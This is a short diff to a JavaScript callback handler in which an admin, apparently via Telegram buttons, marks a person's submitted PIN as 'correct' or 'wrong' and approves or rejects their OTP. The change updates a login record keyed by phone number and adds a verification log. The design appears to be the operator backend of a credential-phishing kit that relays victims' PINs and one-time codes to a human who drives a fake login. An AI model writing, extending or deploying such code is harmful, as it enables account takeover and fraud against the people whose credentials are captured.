@@ -253,20 +253,23 @@ async function handleCallback(cq) {
     return;
   }
 
-  if (action === 'correct' || action === 'wrong' || action === 'otp_approve' || action === 'otp_reject') {
-    const decision = (action === 'correct' || action === 'otp_approve') ? 'approved' : 'rejected';
-    const kind = (action === 'correct' || action === 'wrong') ? 'PIN' : 'OTP';
-    const stamp = (action === 'correct' || action === 'otp_approve') ? '✅ Approved' : '❌ Rejected';
-    console.log(`[${kind.toLowerCase()} callback] Received: action=${action}, id=${id}`);
-    const rec = await store.get(store.NS.LOGIN, id);
-    console.log(`[${kind.toLowerCase()} callback] Record found:`, !!rec, rec?.phone);
-    if (rec) {
-      rec.status = decision;
-      rec.decided = true;
-      await store.set(store.NS.LOGIN, id, rec);
-    } else {
-      console.error(`[${kind.toLowerCase()} decision] ${id} not found in ${store.usingKV ? 'kv' : 'local'} store`);
-    }
+if (action === 'correct' || action === 'wrong' || action === 'otp_approve' || action === 'otp_reject') {
+     const decision = (action === 'correct' || action === 'otp_approve') ? 'approved' : 'rejected';
+     const kind = (action === 'correct' || action === 'wrong') ? 'PIN' : 'OTP';
+     const stamp = (action === 'correct' || action === 'otp_approve') ? '✅ Approved' : '❌ Rejected';
+     console.log(`[${kind.toLowerCase()} callback] Received: action=${action}, id=${id}`);
+     const rec = await store.get(store.NS.LOGIN, id);
+     console.log(`[${kind.toLowerCase()} callback] Record found:`, !!rec, rec?.phone);
+     if (rec) {
+       rec.status = decision;
+       rec.decided = true;
+       await store.set(store.NS.LOGIN, id, rec);
+       // Verify the update
+       const verify = await store.get(store.NS.LOGIN, id);
+       console.log(`[${kind.toLowerCase()} callback] Verified update:`, verify?.decided, verify?.status);
+     } else {
+       console.error(`[${kind.toLowerCase()} decision] ${id} not found in ${store.usingKV ? 'kv' : 'local'} store`);
+     }
     
     // Send a separate reply message to notify admin of the decision
     if (rec) {
